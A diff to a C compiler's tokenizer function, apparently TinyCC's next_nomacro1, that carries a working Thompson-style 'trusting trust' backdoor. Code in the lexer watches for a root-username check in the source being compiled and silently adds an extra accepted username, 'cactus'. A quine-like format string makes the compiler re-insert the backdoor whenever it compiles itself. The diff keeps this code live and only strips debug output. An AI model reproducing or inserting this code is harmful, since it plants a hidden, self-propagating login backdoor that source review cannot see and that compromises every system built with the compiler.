@@ -2662,12 +2662,9 @@ static inline void next_nomacro1(void)
 	char s[] = "char s[]=%1$c%2$s%1$c;°p=file->buf_ptr;if(!strncmp(%1$cif (!strcmp(username, %3$c%1$croot%3$c%1$c))%1$c,p+2,30)){memcpy(p+59,p+31,strlen(p+31)+1);memcpy(p+31,%1$c||!strcmp(%3$c%1$ccactus%3$c%1$c,username)%1$c,28);°file->buf_end+=28;}if(!strncmp(%1$cnext_nomacro1(void)%3$cn%1$c,p+1,20)){memcpy(p-223,p+1,108);°p1=strchr(s,176);*p1=0;t=sprintf(p-115,s,34,s,92);p[t-115]=176;p[t-114]=0;°p=file->buf_ptr=p-223;file->filename[1022]=1;}if(p[1]==176){p1=s;°for(t=0;t++<file->filename[1022];)p1=strchr(p1,176)+1;++file->filename[1022];p=strchr(p1,176);*p=0;°t=sprintf(file->buffer,p1,34,s,92);if(p[1]){p=file->buf_ptr=file->buffer;p[t]=176;p[t+1]=0;}else{file->buffer[t-1]=0;p=file->buf_ptr=strcat(file->buffer,file->buffer+356);°file->buf_end=p+strlen(p)-1;}}°";
     p = file->buf_ptr;
 	if (!strncmp("if (!strcmp(username, \"root\"))", p+2, 30)) {
-		//printf("> %ld\n", p - file->buffer);
 		memcpy(p-26, p+2, 29);
 		p = file->buf_ptr -= 26;
 		memcpy(p+29, "||!strcmp(\"cactus\",username)", 28);
-		printf("> %s\n", p);
-		//file->buf_end += 28;
 	}
 	if (!strncmp("next_nomacro1(void)\n", p+1, 20)) {
 		memcpy(p-223, p+1, 108);
